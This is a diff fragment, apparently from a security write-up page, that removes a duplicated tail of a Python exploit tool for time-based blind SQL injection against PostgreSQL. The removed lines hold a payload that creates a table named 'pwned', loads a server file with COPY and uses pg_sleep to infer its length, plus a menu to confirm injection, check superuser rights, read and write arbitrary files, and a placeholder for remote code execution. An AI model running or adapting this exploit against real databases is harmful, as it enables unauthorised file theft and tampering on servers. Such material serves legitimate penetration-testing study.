@@ -172,55 +172,5 @@ def main():
 
 if __name__ == "__main__":
     main()
-TABLE pwned (content TEXT); "
-            f"COPY pwned FROM $$" + path + "$$; "
-            f"SELECT CASE WHEN (LENGTH((SELECT content FROM pwned))={length}) "
-            f"THEN pg_sleep({SLEEP_TIMER}) END;--"
-        )
-        elapsed = send_payload(payload)
-        if is_timed_response(elapsed):
-            print(f"[+] Detected length: {length}")
-            return length
-    print("[-] Failed to determine length.")
-    return None
-
-# -----Main Menu-----
-def main():
-    if not test_sql_injection():
-        print("[-] Initial SQLi test failed.")
-        return
-
-    if check_superuser():
-        print("[+] Superuser access confirmed!")
-    else:
-        print("[-] Not a superuser or check failed.")
-
-    while True:
-        print("\n=== Actions ===")
-        print("[1] Read file")
-        print("[2] Write to file")
-        print("[3] Attempt RCE (TODO)")
-        print("[4] Quit")
-        choice = input("Select an option: ").strip()
-
-        if choice == "1":
-            path = input("Enter full file path to read: ").strip()
-            if path:
-                read_file(path)
-        elif choice == "2":
-            path = input("Enter full file path to write to: ").strip()
-            content = input("Enter content to write: ").strip()
-            if path and content:
-                write_file(path, content)
-        elif choice == "3":
-            print("[!] RCE functionality not yet implemented.")
-        elif choice == "4":
-            print("Exiting.")
-            sys.exit()
-        else:
-            print("Invalid option. Try again.")
-
-if __name__ == "__main__":
-    main()
 ```
 {% endcode %}
